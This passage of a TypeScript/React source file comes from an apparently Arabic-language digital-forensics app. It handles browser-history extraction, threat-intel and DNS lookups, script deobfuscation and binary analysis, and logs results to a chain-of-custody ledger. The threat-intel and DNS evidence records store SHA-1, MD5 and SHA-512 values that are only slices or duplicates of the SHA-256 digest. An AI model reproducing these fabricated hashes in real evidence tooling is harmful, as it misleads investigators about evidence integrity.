        sha512: binaryInfo.sha512,
        md5: binaryInfo.md5,
        entropy: binaryInfo.entropy,
        entropyClassification: binaryInfo.entropyClassification,
      };
      setBrowserStaticResult(combinedStatic);
      localFilesCacheRef.current.set(binaryInfo.sha256, {
        blob: new Blob([buffer], { type: 'application/x-sqlite3' }),
        name: file.name,
        mimeType: 'application/x-sqlite3',
      });

      await evaluateBrowserHistoryWithParserCore(combinedStatic, buffer);
    } catch (err: any) {
      console.error('SQLite Browser Extraction Error:', err);
      setBrowserError(err?.message || 'تعذر قراءة أو تفكيك قاعدة بيانات SQLite.');
      setBrowserStage('error');
      setBrowserAnalyzing(false);
      notifyStatus(err?.message || 'فشل قراءة قاعدة بيانات المتصفح.', 'error');
    }
  };

  const downloadBrowserJsonReport = () => {
    if (!browserStaticResult) return;
    const dossier = {
      platform: 'SOVEREIGN FORENSIC ENGINE v2.5.2 — Browser History & SQLite Artifact Extractor',
      generatedAt: new Date().toISOString(),
      fileInfo: {
        fileName: browserStaticResult.fileName,
        fileSize: browserStaticResult.fileSize,
        sha256: browserStaticResult.sha256,
        sha1: browserStaticResult.sha1,
        md5: browserStaticResult.md5,
        browserEngine: browserStaticResult.browserLabel,
        pageSize: browserStaticResult.pageSize,
      },
      summary: {
        totalUrlsCount: browserStaticResult.totalUrlsCount,
        totalVisitsCount: browserStaticResult.totalVisitsCount,
        flaggedUrlsCount: browserStaticResult.flaggedUrlsCount,
        dateRangeStart: browserStaticResult.dateRangeStart,
        dateRangeEnd: browserStaticResult.dateRangeEnd,
        tables: browserStaticResult.tables,
        topDomains: browserStaticResult.topDomains,
      },
      extractedArtifacts: {
        urls: browserStaticResult.urls,
        visitsTimeline: browserStaticResult.visits,
        downloads: browserStaticResult.downloads,
        searchTerms: browserStaticResult.searchTerms,
      },
      sovereignCoreVerdict: browserAiReport || { status: 'Not completed', error: browserError },
    };
    const blob = new Blob([JSON.stringify(dossier, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `browser_history_forensics_${browserStaticResult.fileName}.json`;
    a.click();
    URL.revokeObjectURL(url);
  };

  // Global Threat Intelligence & Live OSINT Lookup
  const detectThreatInputBadge = (val: string): string => {
    const t = val.trim();
    if (!t) return 'IP / Domain / Hash';
    if (/^[a-fA-F0-9]{64}$/.test(t)) return 'SHA-256 Hash';
    if (/^[a-fA-F0-9]{40}$/.test(t)) return 'SHA-1 Hash';
    if (/^[a-fA-F0-9]{32}$/.test(t)) return 'MD5 Hash';
    if (/^[a-fA-F0-9]{128}$/.test(t)) return 'SHA-512 Hash';
    if (/^(?:\d{1,3}\.){3}\d{1,3}$/.test(t)) return 'IPv4 Address';
    if (t.includes(':') && !t.includes('://')) return 'IPv6 Address';
    return 'Domain / Hostname';
  };

  const runThreatIntelLookup = async (customIndicator?: string) => {
    const target = (customIndicator ?? threatIntelInput).trim();
    if (!target || threatIntelLoading) return;
    if (customIndicator) setThreatIntelInput(customIndicator);

    setThreatIntelLoading(true);
    setThreatIntelError(null);
    setThreatIntelResult(null);

    try {
      let data: any = null;
      let useClientOsint = false;

      try {
        const res = await fetch(apiUrl('/api/threat-intel'), {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ indicator: target }),
        });
        const parsed = await safeReadJsonResponse(res);
        if (res.ok && parsed.isJson && parsed.data?.telemetry) {
          data = parsed.data;
        } else if (res.status === 404 || res.status === 405 || !parsed.isJson) {
          useClientOsint = true;
        } else {
          if (parsed.data?.telemetry) {
            setThreatIntelResult({
              telemetry: parsed.data.telemetry,
              intelligence: null,
              sources: [],
              analyzedAt: new Date().toISOString(),
              modelUsed: 'Threat Hunting OSINT Daemon v3.5',
            });
          }
          throw new Error(parsed.data?.error || 'تعذر إتمام الفحص الاستخباراتي للمؤشر.');
        }
      } catch (reqErr: any) {
        if (!useClientOsint && reqErr instanceof TypeError) {
          useClientOsint = true;
        } else if (!useClientOsint) {
          throw reqErr;
        }
      }

      if (useClientOsint || !data) {
        const liveTelemetry = await gatherOsintClientFallback(target);
        data = buildThreatIntelReportClient(liveTelemetry);
      }

      setThreatIntelResult(data);
      const intel = data.intelligence;
      const telemetry = data.telemetry;
      const countryLabel = telemetry?.serverInfo?.country || telemetry?.rdapInfo?.country || 'غير محدد';
      const asnLabel = telemetry?.serverInfo?.asn || telemetry?.serverInfo?.isp || 'N/A';

      setThreatIntelHistory((prev) => [
        {
          indicator: telemetry.indicator,
          indicatorType: telemetry.indicatorType,
          country: countryLabel,
          asn: asnLabel,
          verdict: intel.verdict,
          riskLevel: intel.riskLevel,
          threatScore: intel.threatScore,
          isMalicious: Boolean(intel.isMalicious),
          analyzedAt: data.analyzedAt,
          fullPayload: data,
        },
        ...prev.filter((item) => item.indicator !== telemetry.indicator).slice(0, 14),
      ]);

      const rawScore = Number(intel.threatScore);
      const threatScore = Math.min(99, Math.max(1, Math.round(Number.isFinite(rawScore) ? rawScore : intel.isMalicious ? 85 : 10)));
      const isThreat =
        Boolean(intel.isMalicious) ||
        threatScore >= 50 ||
        intel.riskLevel === 'حرج' ||
        intel.riskLevel === 'مرتفع';
      const authenticityScore = isThreat
        ? Math.min(45, Math.max(1, 100 - Math.max(threatScore, 55)))
        : Math.max(55, Math.min(99, 100 - threatScore));
      const verdictText = `[OSINT ${telemetry.indicatorType.toUpperCase()}] ${telemetry.indicator} — ${intel.verdict}`;

      // Compute cryptographic SHA-256 for the Threat Intel Dossier
      const dossierJson = JSON.stringify(data, null, 2);
      const encoded = new TextEncoder().encode(dossierJson);
      const digestBuf = await crypto.subtle.digest('SHA-256', encoded);
      const sha256Hex = Array.from(new Uint8Array(digestBuf))
        .map((b) => b.toString(16).padStart(2, '0'))
        .join('');

      // 1. Update Live Audit Log (Dashboard + Firestore)
      await saveAuditLog(
        {
          id: 'ti-' + Math.random().toString(36).substring(2, 9),
          timestamp: new Date().toISOString(),
          fileName: `استخبارات سيبرانية: ${telemetry.indicator}`,
          fileSize: `${countryLabel} | ${asnLabel}`,
          verdict: verdictText,
          score: authenticityScore,
          risk: intel.riskLevel || (isThreat ? 'حرج' : 'منخفض'),
          type: 'clipboard',
          sha256: telemetry.indicatorType.startsWith('hash_') ? telemetry.indicator : sha256Hex,
        },
        { fileSizeRaw: encoded.byteLength, aiProbability: threatScore }
      );

      // 2. Save Threat Intel Artifact into Evidence & immediately update Dashboard Threats Counter
      const tiForensicResult: ForensicResult = {
        fileName: `OSINT-${telemetry.indicator}.json`,
        fileSize: encoded.byteLength,
        fileSizeFormatted: formatFileSize(encoded.byteLength),
        lastModified: data.analyzedAt,
        mimeType: 'application/vnd.sovereign.threat-intel+json',
        width: 0,
        height: 0,
        sha256: sha256Hex,
        sha1: sha256Hex.substring(0, 40),
        sha512: sha256Hex + sha256Hex,
        md5: sha256Hex.substring(0, 32),
        hexBytes: [],
        detectedFileType: `تقرير استخبارات سيبرانية (${telemetry.indicatorType.toUpperCase()})`,
        expectedExtensions: ['json'],
        exif: {
          hasExif: false,
          message: `Indicator: ${telemetry.indicator} | Country: ${countryLabel} | ASN: ${asnLabel}`,
        },
        laplacianVariance: 0,
        sensorGrainNoise: 0,
        elaScore: 0,
        aiProbability: threatScore,
        authenticityScore,
        verdict: verdictText,
        riskLevel: intel.riskLevel || 'متوسط',
        localReport: {
          verdict: intel.verdict,
          riskLevel: intel.riskLevel,
          detailedReport: intel.executiveSummary,
          indicators: intel.osintFindings || [],
        },
        entropy: 4.5,
        entropyClassification: 'بيانات استخباراتية مهيكلة (OSINT JSON)',
        headerHex: '7B 0A 20 20 22 74 65 6C',
        isMasqueraded: false,
        masqueradeWarning: null,
      };

      await saveEvidenceToCloud(
        `OSINT-${telemetry.indicator}.json`,
        encoded.byteLength,
        'application/vnd.sovereign.threat-intel+json',
        sha256Hex,
        sha256Hex.substring(0, 40),
        sha256Hex + sha256Hex,
        sha256Hex.substring(0, 32),
        tiForensicResult,
        encoded.buffer,
        ''
      );

      // 3. Record Chain of Custody ledger block
      await recordCustodyLedgerBlock(
        `osint-${sha256Hex.substring(0, 14)}`,
        'LOG_ANALYSIS',
        `فحص استخبارات سيبرانية عالمي للمؤشر (${telemetry.indicator})`,
        'محرك الاستخبارات السيبرانية العالمي (Global Threat Intel)',
        `النوع: ${telemetry.indicatorType} | الدولة: ${countryLabel} | الخادم/ASN: ${asnLabel} | التقييم: ${intel.verdict} (${intel.riskLevel} - ${threatScore}/100)`
      );

      notifyStatus(
        isThreat
          ? `تنبيه استخباراتي حرج: المؤشر ${telemetry.indicator} مصنف كتهديد (${intel.riskLevel}) وتم تحديث عداد التهديدات وسجل العمليات!`
          : `اكتمل الفحص الاستخباراتي للمؤشر ${telemetry.indicator} (${intel.riskLevel}) وتم التحديث في لوحة التحكم.`,
        isThreat ? 'error' : 'success'
      );
    } catch (err: any) {
      console.error('Threat Intel Lookup Error:', err);
      setThreatIntelError(err?.message || 'حدث خطأ أثناء الفحص الاستخباراتي للمؤشر.');
      notifyStatus(err?.message || 'فشل الفحص الاستخباراتي للمؤشر.', 'error');
    } finally {
      setThreatIntelLoading(false);
    }
  };

  const downloadThreatIntelJson = () => {
    if (!threatIntelResult) return;
    const blob = new Blob([JSON.stringify(threatIntelResult, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `threat_intel_${threatIntelResult.telemetry?.indicator || 'report'}.json`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const runDnsIpLookup = async (customTarget?: string) => {
    const target = (customTarget ?? threatIntelInput).trim();
    if (!target || dnsLookupLoading) return;
    if (customTarget) setThreatIntelInput(customTarget);

    setDnsLookupLoading(true);
    setDnsLookupError(null);

    try {
      let data: any = null;
      let useClientDns = false;
      try {
        const res = await fetch(apiUrl('/api/dns-ip-lookup'), {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ target }),
        });
        const parsed = await safeReadJsonResponse(res);
        if (res.ok && parsed.isJson && parsed.data?.telemetry) {
          data = parsed.data;
        } else if (res.status === 404 || res.status === 405 || !parsed.isJson) {
          useClientDns = true;
        } else {
          throw new Error(parsed.data?.error || 'تعذر استخراج بيانات DNS والشبكة للمؤشر.');
        }
      } catch (reqErr: any) {
        if (!useClientDns && reqErr instanceof TypeError) {
          useClientDns = true;
        } else if (!useClientDns) {
          throw reqErr;
        }
      }

      if (useClientDns || !data) {
        const liveTelemetry = await gatherOsintClientFallback(target);
        data = { success: true, telemetry: liveTelemetry };
      }

      setDnsLookupResult(data.telemetry);
      
      const telemetry = data.telemetry;
      const countryLabel = telemetry?.serverInfo?.country || 'غير محدد';
      const asnLabel = telemetry?.serverInfo?.asn || telemetry?.serverInfo?.isp || 'N/A';

      setTelemetryLogs(prev => [
        {
          id: 'dns-' + Date.now(),
          timestamp: new Date().toISOString().slice(11, 19),
          subsystem: 'GATEWAY',
          message: `DNS & IP Engine: Resolved ${telemetry.indicator} (${countryLabel}) • ${asnLabel}`,
          level: 'ok'
        },
        ...prev.slice(0, 19)
      ]);

      await saveAuditLog({
        id: 'dns-' + Math.random().toString(36).substring(2, 9),
        timestamp: new Date().toISOString(),
        fileName: `استعلام DNS/IP: ${telemetry.indicator}`,
        fileSize: `${countryLabel} | ${asnLabel}`,
        verdict: `تم استخراج سجلات DNS والخادم الحية بنجاح (${telemetry.indicatorType})`,
        score: 95,
        risk: 'منخفض',
        type: 'clipboard',
        sha256: 'N/A'
      });

      notifyStatus(`تم جلب بيانات DNS و IP الحية لـ (${telemetry.indicator}) بنجاح.`, 'success');
    } catch (err: any) {
      console.error('DNS Lookup error:', err);
      setDnsLookupError(err?.message || 'تعذر استخراج بيانات DNS والشبكة.');
      notifyStatus(err?.message || 'فشل فحص DNS & IP.', 'error');
    } finally {
      setDnsLookupLoading(false);
    }
  };

  const attachTelemetryToCase = async (telemetry: LiveNetworkTelemetry, customTitle?: string) => {
    const activeInv = investigations.find(i => i.id === currentInvestigationId);
    if (!activeInv) {
      notifyStatus('يرجى اختيار أو إنشاء قضية نشطة أولاً لربط النتيجة بها.', 'warning');
      setShowNewInvModal(true);
      return;
    }
    try {
      const payloadStr = JSON.stringify(telemetry, null, 2);
      const encoded = new TextEncoder().encode(payloadStr);
      const digestBuf = await crypto.subtle.digest('SHA-256', encoded);
      const sha256Hex = Array.from(new Uint8Array(digestBuf))
        .map((b) => b.toString(16).padStart(2, '0'))
        .join('');

      const countryLabel = telemetry.serverInfo?.country || 'غير محدد';
      const asnLabel = telemetry.serverInfo?.asn || telemetry.serverInfo?.isp || 'N/A';

      const tiForensicResult: ForensicResult = {
        fileName: `DNS-IP-${telemetry.indicator}.json`,
        fileSize: encoded.byteLength,
        fileSizeFormatted: formatFileSize(encoded.byteLength),
        lastModified: new Date().toISOString(),
        mimeType: 'application/vnd.sovereign.threat-intel+json',
        width: 0,
        height: 0,
        sha256: sha256Hex,
        sha1: sha256Hex.substring(0, 40),
        sha512: sha256Hex + sha256Hex,
        md5: sha256Hex.substring(0, 32),
        hexBytes: [],
        detectedFileType: `توثيق سجلات DNS و IP (${telemetry.indicatorType.toUpperCase()})`,
        expectedExtensions: ['json'],
        exif: { hasExif: false, message: `Country: ${countryLabel} | ASN: ${asnLabel}` },
        laplacianVariance: 0,
        sensorGrainNoise: 0,
        elaScore: 0,
        aiProbability: 10,
        authenticityScore: 90,
        verdict: customTitle || `[DNS & IP] ${telemetry.indicator} — توثيق شبكي لقضية (${activeInv.title})`,
        riskLevel: 'منخفض',
        localReport: {
          verdict: 'توثيق سجلات شبكية رسمي',
          riskLevel: 'منخفض',
          detailedReport: `تم ربط استعلام DNS وبيانات الاستضافة بالملف القضائي (${activeInv.title}).`,
          indicators: [`Country: ${countryLabel}`, `ASN: ${asnLabel}`]
        },
        entropy: 4.3,
        entropyClassification: 'Structured JSON',
        headerHex: '7B 0A 20 20',
        isMasqueraded: false,
        masqueradeWarning: null
      };

      await saveEvidenceToCloud(
        `DNS-IP-${telemetry.indicator}.json`,
        encoded.byteLength,
        'application/vnd.sovereign.threat-intel+json',
        sha256Hex,
        sha256Hex.substring(0, 40),
        sha256Hex + sha256Hex,
        sha256Hex.substring(0, 32),
        tiForensicResult,
        encoded.buffer,
        ''
      );

      await recordCustodyLedgerBlock(
        `dns-${sha256Hex.substring(0, 14)}`,
        'LOG_ANALYSIS',
        `ربط سجلات DNS و IP بالمؤشر (${telemetry.indicator}) للقضية (${activeInv.title})`,
        'محرك فحص النطاقات وعناوين IP',
        `معرف القضية: ${activeInv.id} | بصمة SHA-256: ${sha256Hex}`
      );

      notifyStatus(`تم توثيق وربط نتائج فحص (${telemetry.indicator}) بملف القضية (${activeInv.title}) بنجاح.`, 'success');
    } catch (err: any) {
      console.error('Error attaching telemetry to case:', err);
      notifyStatus(err?.message || 'تعذر ربط الدليل بالقضية.', 'error');
    }
  };

  const renderCaseContextBanner = (labName: string) => {
    const activeInv = investigations.find(i => i.id === currentInvestigationId);
    return (
      <div className="flex flex-wrap items-center justify-between gap-3 px-4 py-3 rounded-2xl bg-gray-900/90 border border-gray-800 text-xs shadow-md">
        <div className="flex items-center gap-2.5">
          <div className="w-8 h-8 rounded-lg bg-[#D4AF37]/15 border border-[#D4AF37]/30 flex items-center justify-center text-[#D4AF37] shrink-0">
            <Briefcase className="w-4 h-4" />
          </div>
          <div>
            <div className="text-[10px] text-gray-500 font-mono">سياق القضية الجنائية • {labName}</div>
            <div className="flex items-center gap-2 mt-0.5">
              <span className="text-gray-400">القضية الحالية:</span>
              {activeInv ? (
                <span className="font-bold text-[#D4AF37] flex items-center gap-1.5">
                  <span>{activeInv.title}</span>
                  {activeInv.caseNumber && (
                    <span className="font-mono text-[10px] px-1.5 py-0.5 rounded bg-gray-800 text-emerald-400 border border-gray-700">
                      {activeInv.caseNumber}
                    </span>
                  )}
                </span>
              ) : (
                <span className="text-amber-400 font-medium">لم يتم تحديد قضية (الأدلة ستُحفظ في السجل العام)</span>
              )}
            </div>
          </div>
        </div>
        <div className="flex items-center gap-2">
          {investigations.length > 0 && (
            <select
              value={currentInvestigationId || ''}
              onChange={(e) => changeCurrentInvestigation(e.target.value || null)}
              className="bg-gray-950 border border-gray-700 text-gray-200 text-xs rounded-xl px-3 py-1.5 outline-none focus:border-[#D4AF37] max-w-[200px] truncate"
            >
              <option value="">-- بدون ربط (أدلة عامة) --</option>
              {investigations.map(inv => (
                <option key={inv.id} value={inv.id}>
                  {inv.title} {inv.caseNumber ? `(${inv.caseNumber})` : ''}
                </option>
              ))}
            </select>
          )}
          <button
            onClick={() => setShowNewInvModal(true)}
            className="px-3 py-1.5 bg-[#D4AF37] hover:bg-[#c29f30] text-gray-950 rounded-xl text-xs font-bold transition flex items-center gap-1.5 shrink-0"
          >
            <Plus className="w-3.5 h-3.5" />
            فتح قضية جديدة
          </button>
        </div>
      </div>
    );
  };

  // Malicious Script & Payload Deobfuscator Pipeline
  const evaluateScriptWithDeobfuscatorCore = async (
    staticData: ScriptDeobfuscationResult & {
      sha256: string;
      sha1: string;
      sha512: string;
      md5: string;
      binaryEntropy: number;
      entropyClassification: string;
      headerHex: string;
    },
    rawBuffer?: ArrayBuffer
  ) => {
    setScriptStage('ai_evaluating');
    setScriptError(null);
    setScriptAnalyzing(true);
    try {
      const res = await fetch(apiUrl('/api/analyze-script'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          fileName: staticData.fileName,
          fileSize: staticData.fileSize,
          sha256: staticData.sha256,
          language: staticData.language,
          entropy: staticData.entropy,
          layersCount: staticData.layersCount,
          obfuscationTechniques: staticData.obfuscationTechniques,
          extractedUrls: staticData.extractedUrls,
          extractedIps: staticData.extractedIps,
          extractedCommands: staticData.extractedCommands,
          registryAndPaths: staticData.registryAndPaths,
          originalSnippet: staticData.originalCode.slice(0, 4000),
          finalDeobfuscatedCode: staticData.finalDeobfuscatedCode.slice(0, 8000),
        }),
      });
      const parsed = await safeReadJsonResponse(res);
      const data = parsed.data || {};
      if (!res.ok || !parsed.isJson) {
        throw new Error(data.error || 'تعذر الحصول على التقرير الجنائي للسكربت من Neural-X Deobfuscator Core.');
      }

      setScriptAiReport(data);
      setScriptStage('done');

      const rawScore = Number(data.threatScore);
      const threatScore = Math.min(99, Math.max(1, Math.round(Number.isFinite(rawScore) ? rawScore : data.isMalicious ? 90 : 12)));
      const isThreat =
        Boolean(data.isMalicious) ||
        threatScore >= 50 ||
        data.riskLevel === 'حرج' ||
        data.riskLevel === 'مرتفع';
      const authenticityScore = isThreat
        ? Math.min(45, Math.max(1, 100 - Math.max(threatScore, 55)))
        : Math.max(55, Math.min(99, 100 - threatScore));
      const verdictText = `[${staticData.language}] ${data.verdict} — ${data.malwareFamilyOrType}`;

      // 1. Update Live Audit Log
      await saveAuditLog(
        {
          id: 'scr-' + Math.random().toString(36).substring(2, 9),
          timestamp: new Date().toISOString(),
          fileName: `سكربت: ${staticData.fileName}`,
          fileSize: `${formatFileSize(staticData.fileSize)} | ${staticData.layersCount} طبقات`,
          verdict: verdictText,
          score: authenticityScore,
          risk: data.riskLevel || (isThreat ? 'حرج' : 'منخفض'),
          type: 'clipboard',
          sha256: staticData.sha256,
        },
        { fileSizeRaw: staticData.fileSize, aiProbability: threatScore }
      );

      // 2. Save Script Artifact into Evidence & immediately update Dashboard Threats Counter
      if (rawBuffer) {
        const scriptForensicResult: ForensicResult = {
          fileName: staticData.fileName,
          fileSize: staticData.fileSize,
          fileSizeFormatted: formatFileSize(staticData.fileSize),
          lastModified: staticData.extractionTimestamp,
          mimeType: 'application/vnd.sovereign.script-forensics',
          width: 0,
          height: 0,
          sha256: staticData.sha256,
          sha1: staticData.sha1,
          sha512: staticData.sha512,
          md5: staticData.md5,
          hexBytes: [],
          detectedFileType: `تحليل وفك تشويه سكربت (${staticData.language})`,
          expectedExtensions: ['ps1', 'js', 'py', 'vbs', 'bat', 'sh'],
          exif: {
            hasExif: false,
            message: `Layers: ${staticData.layersCount} | Commands: ${staticData.extractedCommands.length} | URLs: ${staticData.extractedUrls.length}`,
          },
          laplacianVariance: 0,
          sensorGrainNoise: 0,
          elaScore: 0,
          aiProbability: threatScore,
          authenticityScore,
          verdict: verdictText,
          riskLevel: data.riskLevel || 'متوسط',
          localReport: {
            verdict: data.verdict,
            riskLevel: data.riskLevel,
            detailedReport: data.executiveSummary,
            indicators: data.hiddenPayloadFindings || [],
          },
          entropy: staticData.binaryEntropy,
          entropyClassification: staticData.entropyClassification,
          headerHex: staticData.headerHex,
          isMasqueraded: staticData.layersCount > 0 && isThreat,
          masqueradeWarning:
            staticData.layersCount > 0 && isThreat
              ? `تم رصد ${staticData.layersCount} طبقات تشويه لإخفاء حمولة (${data.malwareFamilyOrType})`
              : null,
        };

        await saveEvidenceToCloud(
          staticData.fileName,
          staticData.fileSize,
          'application/vnd.sovereign.script-forensics',
          staticData.sha256,
          staticData.sha1,
          staticData.sha512,
          staticData.md5,
          scriptForensicResult,
          rawBuffer,
          ''
        );
      }

      // 3. Record Chain of Custody ledger block
      await recordCustodyLedgerBlock(
        `scr-${staticData.sha256.substring(0, 14)}`,
        'FILE_INSPECTION',
        `فك تشويه وتحليل سكربت خبيث عبر Neural-X Daemon (${staticData.fileName})`,
        'محلل وسكربتات الحزم الخبيثة وفك التشويه',
        `اللغة: ${staticData.language} | الطبقات المفكوكة: ${staticData.layersCount} | أوامر خفية: ${staticData.extractedCommands.length} | روابط/IPs: ${staticData.extractedUrls.length + staticData.extractedIps.length} | الحكم: ${data.verdict} (${data.riskLevel})`
      );

      notifyStatus(
        isThreat
          ? `تنبيه برمجية خبيثة: تم كشف حمولة (${data.malwareFamilyOrType}) في ${staticData.fileName} وتحديث التهديدات وسجل العمليات!`
          : `اكتمل فك تشويه وفحص ${staticData.fileName} (${data.riskLevel}) وتم تحديث السجلات.`,
        isThreat ? 'error' : 'success'
      );
    } catch (err: any) {
      console.error('Script Deobfuscator Daemon Error:', err);
      setScriptError(err?.message || 'حدث خطأ أثناء تحليل السكربت عبر Neural-X Deobfuscator Core.');
      setScriptStage('error');
      notifyStatus('تعذر إكمال التحليل المتقدم — نتائج فك التشويه البرمجي معروضة أدناه.', 'warning');
    } finally {
      setScriptAnalyzing(false);
    }
  };

  const runScriptDeobfuscationPipeline = async (codeText: string, fileName: string, rawBuffer: ArrayBuffer) => {
    setScriptAnalyzing(true);
    setScriptStage('deobfuscating');
    setScriptError(null);
    setScriptAiReport(null);
    setScriptStaticResult(null);

    try {
      const binaryInfo = await analyzeFileBinary(rawBuffer, fileName, 'text/plain');
      const deobf = await deobfuscateScriptPayload(codeText, fileName);
      const combinedStatic = {
        ...deobf,
        sha256: binaryInfo.sha256,
        sha1: binaryInfo.sha1,
        sha512: binaryInfo.sha512,
        md5: binaryInfo.md5,
        binaryEntropy: binaryInfo.entropy,
        entropyClassification: binaryInfo.entropyClassification,
        headerHex: binaryInfo.headerHex,
      };
      scriptBufferRef.current = rawBuffer;
      setScriptStaticResult(combinedStatic);
      setScriptActiveSubTab(deobf.layersCount > 0 ? 'layers' : deobf.extractedCommands.length > 0 ? 'commands' : 'diff');
      localFilesCacheRef.current.set(binaryInfo.sha256, {
        blob: new Blob([rawBuffer], { type: 'text/plain' }),
        name: fileName,
        mimeType: 'text/plain',
      });

      await evaluateScriptWithDeobfuscatorCore(combinedStatic, rawBuffer);
    } catch (err: any) {
      console.error('Script Deobfuscation Error:', err);
      setScriptError(err?.message || 'حدث خطأ أثناء قراءة وفك تشويه السكربت.');
      setScriptStage('error');
      setScriptAnalyzing(false);
      notifyStatus(err?.message || 'فشل فك تشويه السكربت.', 'error');
    }
  };

  const handleScriptFileUpload = async (file: File) => {
    try {
      const buffer = await file.arrayBuffer();
      const text = new TextDecoder('utf-8', { fatal: false }).decode(buffer);
      setScriptInputText(text.slice(0, 120000));
      setScriptFileNameInput(file.name);
      await runScriptDeobfuscationPipeline(text, file.name, buffer);
    } catch (err: any) {
      setScriptError(err?.message || 'تعذر قراءة الملف النصي.');
      setScriptStage('error');
    }
  };

  const runManualScriptDeobfuscation = async () => {
    const trimmed = scriptInputText.trim();
    if (!trimmed || scriptAnalyzing) return;
    const fname = scriptFileNameInput.trim() || 'manual_script.txt';
    const encoded = new TextEncoder().encode(scriptInputText);
    await runScriptDeobfuscationPipeline(scriptInputText, fname, encoded.buffer);
  };

  const downloadScriptJsonReport = () => {
    if (!scriptStaticResult) return;
    const dossier = {
      platform: 'SOVEREIGN FORENSIC ENGINE v2.5.2 — Malicious Script & Payload Deobfuscator',
      generatedAt: new Date().toISOString(),
      fileInfo: {
        fileName: scriptStaticResult.fileName,
        fileSize: scriptStaticResult.fileSize,
        language: scriptStaticResult.language,
        sha256: scriptStaticResult.sha256,
        sha1: scriptStaticResult.sha1,
        md5: scriptStaticResult.md5,
        entropy: scriptStaticResult.entropy,
      },
      deobfuscation: {
        layersCount: scriptStaticResult.layersCount,
        obfuscationTechniques: scriptStaticResult.obfuscationTechniques,
        layers: scriptStaticResult.layers,
        finalDeobfuscatedCode: scriptStaticResult.finalDeobfuscatedCode,
      },
      extractedIndicators: {
        commands: scriptStaticResult.extractedCommands,
        urls: scriptStaticResult.extractedUrls,
        ips: scriptStaticResult.extractedIps,
        registryAndPaths: scriptStaticResult.registryAndPaths,
      },
      sovereignCoreVerdict: scriptAiReport || { status: 'Pending / Error', error: scriptError },
    };
    const blob = new Blob([JSON.stringify(dossier, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `script_deobfuscation_report_${scriptStaticResult.fileName}.json`;
    a.click();
    URL.revokeObjectURL(url);
  };

  // Binary, PE/ELF Headers & Deep Strings Forensic Lab Pipeline
  const evaluateBinaryLabWithCore = async (
    staticData: BinaryDeepForensicsResult & {
      sha256: string;
      sha1: string;
      sha512: string;
      md5: string;
      headerHex: string;
    },
    rawBuffer?: ArrayBuffer
  ) => {
    setBinaryLabStage('ai_evaluating');
    setBinaryLabError(null);
    setBinaryLabAnalyzing(true);
    try {
      const res = await fetch(apiUrl('/api/analyze-binary'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          fileName: staticData.fileName,
          fileSize: staticData.fileSize,
          sha256: staticData.sha256,
          format: staticData.format,
          magicDescription: staticData.magicDescription,
          overallEntropy: staticData.overallEntropy,
          peDetails: staticData.peDetails,
          elfDetails: staticData.elfDetails,
          detectedDlls: staticData.detectedDlls,
          suspiciousApis: staticData.suspiciousApis,
          extractedUrls: staticData.extractedUrls,
          extractedIps: staticData.extractedIps,
          registryAndPaths: staticData.registryAndPaths,
          suspiciousStrings: staticData.suspiciousStrings.slice(0, 35),
          headerHexDump: staticData.headerHexDump.slice(0, 12),
        }),
      });
      const parsed = await safeReadJsonResponse(res);
      const data = parsed.data || {};
      if (!res.ok || !parsed.isJson) {
        throw new Error(data.error || 'تعذر الحصول على التحليل الجنائي الثنائي من Sovereign Binary Telemetry Core.');
      }

      setBinaryLabAiReport(data);
      setBinaryLabStage('done');

      const rawScore = Number(data.threatScore);
      const threatScore = Math.min(99, Math.max(1, Math.round(Number.isFinite(rawScore) ? rawScore : data.isMalicious ? 88 : 12)));
      const isThreat =
        Boolean(data.isMalicious) ||
        threatScore >= 50 ||
        data.riskLevel === 'حرج' ||
        data.riskLevel === 'مرتفع';
      const authenticityScore = isThreat
        ? Math.min(45, Math.max(1, 100 - Math.max(threatScore, 55)))
        : Math.max(55, Math.min(99, 100 - threatScore));
      const verdictText = `[${staticData.format}] ${data.verdict} — ${data.threatClassification}`;

      // 1. Update Live Audit Log
      await saveAuditLog(
        {
          id: 'bin-' + Math.random().toString(36).substring(2, 9),
          timestamp: new Date().toISOString(),
          fileName: `باينري: ${staticData.fileName}`,
          fileSize: `${formatFileSize(staticData.fileSize)} | ${staticData.format}`,
          verdict: verdictText,
          score: authenticityScore,
          risk: data.riskLevel || (isThreat ? 'حرج' : 'منخفض'),
          type: 'clipboard',
          sha256: staticData.sha256,
        },
        { fileSizeRaw: staticData.fileSize, aiProbability: threatScore }
      );

      // 2. Save Artifact into Evidence & immediately update Dashboard Threats Counter
      if (rawBuffer) {
        const binForensicResult: ForensicResult = {
          fileName: staticData.fileName,
          fileSize: staticData.fileSize,
          fileSizeFormatted: formatFileSize(staticData.fileSize),
          lastModified: staticData.extractionTimestamp,
          mimeType: 'application/vnd.sovereign.binary-forensics',
          width: 0,
          height: 0,
          sha256: staticData.sha256,
          sha1: staticData.sha1,
          sha512: staticData.sha512,
          md5: staticData.md5,
          hexBytes: [],
          detectedFileType: staticData.magicDescription,
          expectedExtensions: ['exe', 'dll', 'elf', 'so', 'bin', 'dmp'],
          exif: {
            hasExif: false,
            message: `Format: ${staticData.format} | Entropy: ${staticData.overallEntropy} | APIs: ${staticData.suspiciousApis.length} | Strings: ${staticData.totalStringsCount}`,
          },
          laplacianVariance: 0,
          sensorGrainNoise: 0,
          elaScore: 0,
          aiProbability: threatScore,
          authenticityScore,
          verdict: verdictText,
          riskLevel: data.riskLevel || 'متوسط',
          localReport: {
            verdict: data.verdict,
            riskLevel: data.riskLevel,
            detailedReport: data.executiveSummary,
            indicators: data.suspiciousFindings || [],
          },
          entropy: staticData.overallEntropy,
          entropyClassification: staticData.entropyClassification,
          headerHex: staticData.headerHex,
          isMasqueraded: Boolean(staticData.peDetails?.hasHighEntropySection || staticData.peDetails?.hasRwxSection),
          masqueradeWarning: staticData.peDetails?.hasRwxSection
            ? 'رصد مقاطع تنفيذية قابلة للكتابة والتنفيذ (RWX Section) أو تعبئة عالية الإنتروبيا'
            : null,
        };

        await saveEvidenceToCloud(
